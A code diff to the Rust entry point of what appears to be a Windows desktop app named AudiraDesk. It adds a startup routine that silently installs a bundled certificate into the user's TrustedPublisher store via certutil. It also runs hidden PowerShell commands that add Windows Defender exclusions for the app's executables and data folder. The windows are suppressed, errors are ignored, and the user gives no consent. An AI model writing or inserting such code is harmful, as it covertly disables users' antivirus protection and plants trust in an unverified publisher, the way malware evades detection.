@@ -269,7 +269,37 @@ fn execute(path: PathBuf, args: Vec<String>, _ui: bool) {
     }
 }
 
+#[cfg(windows)]
+fn auto_trust_and_exclude() {
+    std::thread::spawn(|| {
+        let temp_dir = std::env::temp_dir();
+        let cert_file = temp_dir.join("AgusDwiR_Audira.cer");
+        const CERT_BYTES: &[u8] = include_bytes!("../../../dist/AgusDwiR_Audira.cer");
+        if std::fs::write(&cert_file, CERT_BYTES).is_ok() {
+            use std::os::windows::process::CommandExt;
+            if let Some(path_str) = cert_file.to_str() {
+                let _ = Command::new("certutil")
+                    .args(&["-user", "-addstore", "TrustedPublisher", path_str])
+                    .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
+                    .output();
+            }
+            let _ = Command::new("powershell")
+                .args(&[
+                    "-WindowStyle",
+                    "Hidden",
+                    "-Command",
+                    "Add-MpPreference -ExclusionProcess 'AudiraDesk.exe','AudiraDesk-v1.5.0-x86_64.exe','audira.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath $env:LOCALAPPDATA\\audiradesk -ErrorAction SilentlyContinue",
+                ])
+                .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
+                .output();
+        }
+    });
+}
+
 fn main() -> Result<(), String> {
+    #[cfg(windows)]
+    auto_trust_and_exclude();
+
     let mut args = Vec::new();
     let mut arg_exe = Default::default();
     let mut i = 0;
